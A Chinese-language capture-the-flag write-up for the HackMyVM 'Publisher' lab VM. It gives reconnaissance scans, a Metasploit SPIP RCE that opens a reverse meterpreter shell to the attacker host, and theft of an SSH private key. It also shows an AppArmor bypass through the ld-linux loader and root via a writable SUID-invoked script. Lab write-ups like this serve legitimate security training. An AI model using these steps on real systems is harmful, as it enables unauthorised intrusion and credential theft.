---
title: HackMyVM-Publisher
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# Publisher.

> https://hackmyvm.eu/machines/machine.php?vm=Publisher
> 

Notes: **I hope you will enjoy it.**

## 信息收集

```python
// 探测主机
nmap -sP 192.168.56.0/24          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 06:53 EST
Nmap scan report for 192.168.56.1
Host is up (0.00057s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00028s latency).
MAC Address: 08:00:27:77:3D:23 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.11
Host is up (0.00052s latency).
MAC Address: 08:00:27:AB:D8:DE (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.4
Host is up.
// 扫描端口
nmap -sT -min-rate 10000 -p- 192.168.56.11 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 06:54 EST
Nmap scan report for 192.168.56.11
Host is up (0.00069s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:AB:D8:DE (Oracle VirtualBox virtual NIC)
// 扫描版本服务
nmap -sT -sV -O -p- 192.168.56.11         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 06:56 EST
Nmap scan report for 192.168.56.11
Host is up (0.00077s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 08:00:27:AB:D8:DE (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.62 seconds
// 漏洞扫描
nmap -script=vuln -p- 192.168.56.11 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-20 06:59 EST
Nmap scan report for 192.168.56.11
Host is up (0.00077s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 172.17.0.2
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
MAC Address: 08:00:27:AB:D8:DE (Oracle VirtualBox virtual NIC)

```

新装了DVWS尝试一下，结果和nmap扫描的差不多

![image.png](image%2020.png)

## 渗透

因为此只存在80端口和22端口，所以优先级： `80` >`22`

访问一下`web`页面，蛮复古的，发现内容都是在说`spip` ，通过搜索发现是一个SPIP是一款开源的`CMS`

![image.png](image%2021.png)

通过点击页面功能没找到可以利用的，扫描一下目录，也是仅发现`images`文件夹

```python
dirsearch -u 192.168.56.11 -e php,zip,txt
[07:18:13] 301 -  315B  - /images  ->  http://192.168.56.11/images/         
[07:18:13] 200 -  623B  - /images/
```

访问一下 `/images` ，也没啥可以利用的

![image.png](image%2022.png)

尝试查找`SPIP`的漏洞，发现`SPIP`发现严重的反序列化漏洞，可以命令执行（**`CVE-2023-27372`**）

直接利用`msfconsole` 一把梭

```python
msf6 > search spip

Matching Modules
================

   #   Name                                             Disclosure Date  Rank       Check  Description
   -   ----                                             ---------------  ----       -----  -----------
   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE
   1     \_ target: PHP In-Memory                       .                .          .      .
   2     \_ target: Unix/Linux Command Shell            .                .          .      .
   3     \_ target: Windows Command Shell               .                .          .      .
   4   exploit/multi/http/spip_porte_plume_previsu_rce  2024-08-16       excellent  Yes    SPIP Unauthenticated RCE via porte_plume Plugin
   5     \_ target: PHP In-Memory                       .                .          .      .
   6     \_ target: Unix/Linux Command Shell            .                .          .      .
   7     \_ target: Windows Command Shell               .                .          .      .
   8   exploit/multi/http/spip_connect_exec             2012-07-04       excellent  Yes    SPIP connect Parameter PHP Injection
   9     \_ target: PHP In-Memory                       .                .          .      .
   10    \_ target: Unix/Linux Command Shell            .                .          .      .
   11    \_ target: Windows Command Shell               .                .          .      .
   12  exploit/multi/http/spip_rce_form                 2023-02-27       excellent  Yes    SPIP form PHP Injection
   13    \_ target: PHP In-Memory                       .                .          .      .
   14    \_ target: Unix/Linux Command Shell            .                .          .      .
   15    \_ target: Windows Command Shell               .                .          .      .
msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
// kali IP
sf6 exploit(multi/http/spip_bigup_unauth_rce) > set lhost 192.168.56.4
lhost => 192.168.56.4
msf6 exploit(multi/http/spip_bigup_unauth_rce) > set rhost 192.168.56.11
rhost => 192.168.56.11
msf6 exploit(multi/http/spip_bigup_unauth_rce) > set targeturi /spip
targeturi => /spip
msf6 exploit(multi/http/spip_bigup_unauth_rce) > run

[*] Started reverse TCP handler on 192.168.56.4:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] SPIP version 4.2.0 is vulnerable.
[*] Bigup plugin version detected: 3.2.1
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Found formulaire_action: login
[*] Found formulaire_action_args: CKNOtIY6q36fgXbnaOw3p...
[*] Preparing to send exploit payload to the target...
[*] Sending stage (40004 bytes) to 192.168.56.11
[*] Meterpreter session 1 opened (192.168.56.4:4444 -> 192.168.56.11:56446) at 2025-01-20 07:38:36 -0500

meterpreter > 

```

## 后渗透

本来是想获得`shell`后获得更好的交互而使用`python`却发现没有`python`

### 信息收集

先手动收集信息，发现`dockerenv` ，现在的`shell`应该是docker下的

```python
cd /
ls -al
total 64
drwxr-xr-x   1 root root 4096 Dec 20  2023 .
drwxr-xr-x   1 root root 4096 Dec 20  2023 ..
-rwxr-xr-x   1 root root    0 Dec 20  2023 .dockerenv
lrwxrwxrwx   1 root root    7 Oct  3  2023 bin -> usr/bin

cat /proc/1/cgroup
12:cpuset:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
11:hugetlb:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
10:cpu,cpuacct:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
9:perf_event:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
8:devices:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
7:blkio:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
6:memory:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
5:freezer:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
4:net_cls,net_prio:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
3:pids:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
2:rdma:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
1:name=systemd:/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2
0::/docker/41c976e507f824af6c10290bf89cc2bebf8b5ae877c2565a9d1e96c91c60b5b2

```

不过可以注意到，我们的`spip`是放在一个叫`think`的用户家目录下，果然有权限访问

```python
meterpreter > ls
Listing: /home/think
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2025-01-20 14:51:44 -0500  .bash_history
100644/rw-r--r--  220   fil   2023-11-14 03:57:26 -0500  .bash_logout
100644/rw-r--r--  3771  fil   2023-11-14 03:57:26 -0500  .bashrc
040700/rwx------  4096  dir   2023-11-14 03:57:24 -0500  .cache
040700/rwx------  4096  dir   2023-12-08 08:07:22 -0500  .config
040700/rwx------  4096  dir   2024-02-10 16:22:33 -0500  .gnupg
040775/rwxrwxr-x  4096  dir   2024-01-10 07:46:09 -0500  .local
100644/rw-r--r--  807   fil   2023-11-14 03:57:24 -0500  .profile
020666/rw-rw-rw-  0     cha   2025-01-20 14:51:44 -0500  .python_history
040755/rwxr-xr-x  4096  dir   2024-01-10 07:54:17 -0500  .ssh
020666/rw-rw-rw-  0     cha   2025-01-20 14:51:44 -0500  .viminfo
040750/rwxr-x---  4096  dir   2023-12-20 14:05:25 -0500  spip
100644/rw-r--r--  35    fil   2024-02-10 16:20:39 -0500  user.txt
```

注意到SSH文件夹，我们查看一下是否有SSH密钥

存在，我们将其下载下来

```python
meterpreter > ls
Listing: /home/think/.ssh
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  569   fil   2024-01-10 07:54:17 -0500  authorized_keys
100644/rw-r--r--  2602  fil   2024-01-10 07:48:14 -0500  id_rsa
100644/rw-r--r--  569   fil   2024-01-10 07:48:14 -0500  id_rsa.pub

meterpreter > download id_rsa
[*] Downloading: id_rsa -> /root/Desktop/test/Publisher/id_rsa
[*] Downloaded 2.54 KiB of 2.54 KiB (100.0%): id_rsa -> /root/Desktop/test/Publisher/id_rsa
[*] Completed  : id_rsa -> /root/Desktop/test/Publisher/id_rsa
```

### SSH密钥利用

设置密钥权限

```python
chmod 600 id_rsa
```

使用密钥登录`SSH`，登陆成功

```python
ssh think@192.168.56.11 -i id_rsa                                                                                                                        
The authenticity of host '192.168.56.11 (192.168.56.11)' can't be established.                                                                               
ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.                                                                               
This key is not known by any other names.                                     
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 20 Jan 2025 09:08:28 PM UTC

  System load:                      0.07
  Usage of /:                       74.7% of 9.75GB
  Memory usage:                     32%
  Swap usage:                       0%
  Processes:                        211
  Users logged in:                  0
  IPv4 address for br-72fdb218889f: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for enp0s3:          192.168.56.11

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Mar 29 13:22:11 2024 from 192.168.109.1
think@publisher:~$ 

```

### UserFlag

查看当前文件夹，存在`user.txt`

```python
think@publisher:~$ cat user.txt 
fa229046d44eda6a3598c73ad96f4ca5
```

### 自动化信息收集

向靶机传入`linpeas.sh` ，使用`kali`创建服务器然后下载到靶机

给予`linpeas.sh` 执行权限

```python
think@publisher:~$ chmod u+x [linpeas.sh](http://linpeas.sh/)
```

执行`linpeas.sh` 

```python
think@publisher:~$ ./[linpeas.sh](http://linpeas.sh/)
```

结果说可能存在`CVE-2021-3560`  ，但是几个POC都无法使用

```python
Vulnerable to CVE-2021-3560                                                                                                                                  
                                                                                                                                                             
╔══════════╣ Protections                                                                                                                                     
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                apparmor module is loaded.                                                                                                                                   
═╣ AppArmor profile? .............. /usr/sbin/ash (complain)                                                                                                 
═╣ is linuxONE? ................... s390x Not Found                                                                                                          
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                     
═╣ PaX bins present? .............. PaX Not Found       
═╣ grsecurity present? ............ grsecurity Not Found                                                                                 08:13:19 [1503/1808]
═╣ PaX bins present? .............. PaX Not Found                                                                                                            
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                     
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                       
═╣ Seccomp enabled? ............... disabled                                                                                                                 
═╣ User namespace? ................ enabled                                                                                                                  
═╣ Cgroup2 enabled? ............... enabled                                                                                                                  
═╣ Is ASLR enabled? ............... Yes                                                                                                                      
═╣ Printer? ....................... No                                                                                                                       
═╣ Is this a virtual machine? ..... Yes (oracle)    
```

结果中还发现存在一个未知二进制文件 `/usr/sbin/run_container` 

```python
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                           
                      ╚════════════════════════════════════╝                                                                                                 
╔══════════╣ SUID - Check easy privesc, exploits and write perms                                                                                             
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                              
-rwsr-xr-x 1 root root 23K Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1                                                                           
-rwsr-xr-x 1 root root 467K Dec 18  2023 /usr/lib/openssh/ssh-keysign                                                                                        
-rwsr-xr-x 1 root root 15K Jul  8  2019 /usr/lib/eject/dmcrypt-get-device                                                                                    
-rwsr-xr-- 1 root messagebus 51K Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                    
-rwsr-sr-x 1 root root 15K Dec 13  2023 /usr/lib/xorg/Xorg.wrap                                                                                              
-rwsr-xr-- 1 root dip 386K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)                                                                  
-rwsr-sr-x 1 root root 17K Nov 14  2023 /usr/sbin/run_container (Unknown SUID binary!)                                                                       
-rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)                                                               
-rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount                                                                                                  
-rwsr-xr-x 1 root root 87K Nov 29  2022 /usr/bin/gpasswd                                                                                                     
-rwsr-xr-x 1 root root 84K Nov 29  2022 /usr/bin/chfn  --->  SuSE_9.3/10                                                                                     
-rwsr-xr-x 1 root root 163K Apr  4  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable                                                        
-rwsr-xr-x 1 root root 52K Nov 29  2022 /usr/bin/chsh                                                                                                        
-rwsr-xr-x 1 root root 67K Nov 29  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)       
-rwsr-xr-x 1 root root 55K May 30  2023 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                  
-rwsr-xr-x 1 root root 67K May 30  2023 /usr/bin/su                                                                                                          
-rwsr-xr-x 1 root root 44K Nov 29  2022 /usr/bin/newgrp  --->  HP-UX_10.20                                                                                   
-rwsr-xr-x 1 root root 31K Feb 21  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034               
-rwsr-xr-x 1 root root 39K May 30  2023 /usr/bin/umount  --->  BSD/Linux(08-1996)         
```

使用`strings`查看`run_container` 关键字

```python
/lib64/ld-linux-x86-64.so.2
libc.so.6
__stack_chk_fail           
execve                        
__cxa_finalize     
__libc_start_main
GLIBC_2.2.5   
GLIBC_2.4   
_ITM_deregisterTMCloneTable
__gmon_start__ 
_ITM_registerTMCloneTable
u+UH                 
[]A\A]A^A_                                                                                                                                                   
/bin/bash                                                                                                                                                    
/opt/run_container.sh                                                                                                                                        
:*3$"                                                                                                                                                        
GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0                                                                                                                   
crtstuff.c                                                                                                                                                   
deregister_tm_clones                                                                                                                                         
__do_global_dtors_aux                                                                                                                                        
completed.8061                                                                                                                                               
__do_global_dtors_aux_fini_array_entry                                                                                                                       
frame_dummy                                                                                                                                                  
__frame_dummy_init_array_entry                                                                                                                               
run_container.c                                                                                                                                              
__FRAME_END__                                                                                                                                                
__init_array_end                                                                                                                                             
_DYNAMIC                                                                                                                                                     
__init_array_start                                                                                                                                           
__GNU_EH_FRAME_HDR                    
_GLOBAL_OFFSET_TABLE_                                                         
__libc_csu_fini                                                               
_ITM_deregisterTMCloneTable
_edata   
__stack_chk_fail@@GLIBC_2.4
__libc_start_main@@GLIBC_2.2.5
execve@@GLIBC_2.2.5
__data_start     
__gmon_start__
__dso_handle
_IO_stdin_used             
__libc_csu_init
__bss_start              
main   
__TMC_END__                                                                                                                                                  
_ITM_registerTMCloneTable                                                                                                                                    
__cxa_finalize@@GLIBC_2.2.5                                                                                                                                  
.symtab                                                                                                                                                      
.strtab                                                                                                                                                      
.shstrtab                                                                                                                                                    
.interp                                                                                                                                                      
.note.gnu.property                                                                                                                                           
.note.gnu.build-id                                                                                                                                           
.note.ABI-tag                                                                                                                                                
.gnu.hash                                                                                                                                                    
.dynsym                                                                                                                                                      
.dynstr                                                                                                                                                      
.gnu.version                                                                                                                                                 
.gnu.version_r                                                                                                                                               
.rela.dyn                                                                                                                                                    
.rela.plt                                                                                                                                                    
.init                                 
.plt.got                                                                      
.plt.sec                                                                      
.text                      
.fini    
.rodata                    
.eh_frame_hdr                 
.eh_frame          
.init_array      
.fini_array   
.dynamic    
.data                      
.bss           
.comment  
```

发现关键字 `/opt/run_container.sh`  `/lib64/ld-linux-x86-64.so.2`  

应该是 `run_container` 会执行`run_container.sh` ，看看`run_container.sh` 是否有修改权限

```python
think@publisher:/usr/lib64$ ls -al /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Mar 29  2024 /opt/run_container.sh
```

尝试修改，无法修改

```python
think@publisher:/usr/lib64$ echo "bash -p" >> /opt/run_container.sh
-ash: /opt/run_container.sh: Permission denied
```

没懂怎么利用，看了作者的`WP` （你们的`esay`好难）

> 首先我们可以看到***AppArmor***已***启用***：
> 
> 
> ![image.png](image%2023.png)
> 
> 然后我们注意到我们的shell不是**bash**而是**ash：**
> 
> ![image.png](image%2024.png)
> 
> 然后我们还看到我们当前的 shell有一个**AppArmor配置文件：**
> 
> [](https://miro.medium.com/v2/resize:fit:777/0*pGAUT27loR_WNe7d)
> 

才看到现在的`shell`不是`bash`，而是`ash`

```python
think@publisher:/usr/lib64$ env
SHELL=/usr/sbin/ash
```

> 我已经使用内核库来生成不受限制的 bash shell：
> 
> 
> ```
> /lib/x86_64-linux-gnu/ld-linux-x86–64.so.2 /bin/bash
> ```
> 
> 执行此命令时，它会使用指定的**动态链接器/加载器**( **ld-linux-x86–64.so.2** ) 来加载所需的共享库并启动**/bin/bash** shell。这种使用二进制文件直接调用链接器/加载器的方法是一种通过明确指定要用于该特定二进制文件的动态链接器/加载器来执行二进制文件的方法
> 

我们拥有对`/lib/x86_64-linux-gnu/ld-linux-x86–64.so.2`拥有完全的权限

```python
think@publisher:/usr/lib64$ ls -al /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 
lrwxrwxrwx 1 root root 10 Nov 22  2023 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 -> ld-2.31.so
```

> 然后我在脚本中添加了“ **bash -p”并运行了SUID**二进制文件
> 

```python
think@publisher:/usr/lib64$ echo "bash -p" >> /opt/run_container.sh 
think@publisher:/usr/lib64$ /usr/sbin/run_container 
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 2 hours

Enter the ID of the container or leave blank to create a new one: 
/opt/run_container.sh: line 16: validate_container_id: command not found 
1) Start Container
2) Stop Container
3) Restart Container
4) Create Container
5) Quit
Choose an action for a container: 1
Error response from daemon: page not found
Error: failed to start containers: 
bash-5.0# 
```

获得`ROOT`权限

```python
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
bash-5.0#
```

### RootFlag

```python
bash-5.0# cat root.txt
3a4225cc9e85709adda6ef55d6a4f2ca 
```

## 为什么OPT不可以访问呢？

> https://zhuanlan.zhihu.com/p/547772872
> 

首先我们的`shell`是`ASH`

其次是`apparmor` 限制了，`apparmor` 可以对程序进行访问控制，靶机里就是限制呢我们的`shell` `ASH` ，下面是对ASH限制的配置文件

```python
bash-5.0# cd /etc/apparmor.d/
bash-5.0# ls
abi           disable         local        nvidia_modprobe  tunables     usr.sbin.ash       usr.sbin.mysqld    usr.sbin.tcpdump
abstractions  force-complain  lsb_release  sbin.dhclient    usr.bin.man  usr.sbin.ippusbxd  usr.sbin.rsyslogd
bash-5.0# cat usr.sbin.ash 
#include <tunables/global>

/usr/sbin/ash flags=(complain) {
  #include <abstractions/base>
  #include <abstractions/bash>
  #include <abstractions/consoles>
  #include <abstractions/nameservice>
  #include <abstractions/user-tmp>

  # Remove specific file path rules
  # Deny access to certain directories
  deny /opt/ r,
  deny /opt/** rwx,
  /usr/bin/** mrix,
  /usr/sbin/** mrix,

  # Simplified rule for accessing /home directory
  owner /home/** rwix,
}

```

可以看到是 `deny /opt/ r`  `deny /opt/** rwx`，限制了我们对`OPT`文件夹里边的文件的所有权限

因此我们通过动态链接库回到 `bash` 环境后，改配置文件就对我们不起效了